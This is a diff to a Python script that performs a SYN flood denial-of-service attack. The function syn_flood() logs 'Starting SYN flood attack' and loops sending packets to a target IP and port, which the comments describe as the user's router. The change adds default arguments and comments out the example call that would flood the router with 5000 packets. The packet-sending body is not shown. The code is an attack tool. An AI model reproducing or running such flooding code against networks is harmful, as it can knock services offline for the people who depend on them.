@@ -10,7 +10,7 @@ target_ip = ""  # Replace with your router's IP
 target_port = 80             # Replace with an open port on your router
 
 # Function to send a high volume of SYN packets
-def syn_flood(target_ip, target_port, packet_count=10000):
+def syn_flood(target_ip='', target_port=80, packet_count=10000):
     logger.info(f"Starting SYN flood attack on {target_ip}:{target_port}")
     print(f"Starting SYN flood attack on {target_ip}:{target_port}")
     for i in range(packet_count):
@@ -25,4 +25,4 @@ def syn_flood(target_ip, target_port, packet_count=10000):
     print("Attack completed.")
 
 # Example: Flood the router
-syn_flood(target_ip, target_port, packet_count=5000)
+#syn_flood(target_ip, target_port, packet_count=5000)
